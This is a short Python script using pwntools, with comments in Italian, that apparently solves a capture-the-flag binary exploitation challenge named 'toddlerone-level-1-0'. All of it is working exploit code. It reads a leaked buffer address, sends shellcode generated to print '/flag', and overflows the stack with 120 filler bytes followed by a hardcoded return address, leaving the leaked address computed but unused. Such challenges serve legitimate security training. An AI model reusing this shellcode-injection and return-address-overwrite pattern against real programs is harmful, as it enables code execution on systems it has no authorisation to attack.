from pwn import * 

# Setta l'architettura
context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-1-0')

io = elf.process()

# Find the buff address
io.recvuntil(b"The input buffer begins at 0x")
buff_addr = p64(int(io.recvuntil(b',').decode()[:-1], 16))

# Fa il cat della flag, per noi basta, può fare un po' qualsiasi cosa
# asm è un modulo per assemblare il codice assembly
sc = asm(shellcraft.cat('/flag'))

io.sendline(sc)

# Crea il payload
payload = b'A'*120 + p64(int("2cb39000", 16))

io.sendline(f"{len(payload)}")
io.sendline(payload)

io.interactive()
